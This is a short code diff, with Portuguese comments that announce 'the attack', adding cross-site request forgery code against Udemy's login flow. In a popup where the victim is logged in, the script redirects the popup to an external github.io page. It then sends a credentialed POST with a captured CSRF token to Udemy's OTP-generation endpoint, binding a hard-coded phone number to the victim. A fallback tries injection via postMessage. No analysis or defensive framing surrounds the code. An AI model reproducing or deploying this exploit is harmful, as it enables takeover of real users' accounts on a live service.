@@ -45,7 +45,12 @@
             // O usuário está logado no popup, agora fazemos o ataque
             // Criamos um form no popup ou redirecionamos para nossa página de ataque
             try {
+                console.log("Aqui");
                 popup.location.href = 'https://alanls1.github.io/test/';
+                var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', true); 
+                xhr.withCredentials = true; xhr.setRequestHeader('Content-Type', 'application/json'); 
+                xhr.setRequestHeader('X-CSRF-Token', event.data.token); 
+                xhr.send(JSON.stringify({ "purpose": 3, "phone_number": "+5514996810417" }));
             } catch(e) {
                 // Se falhar por CORS, tentamos injetar via postMessage
                 popup.postMessage({action: 'attack'}, 'https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode');
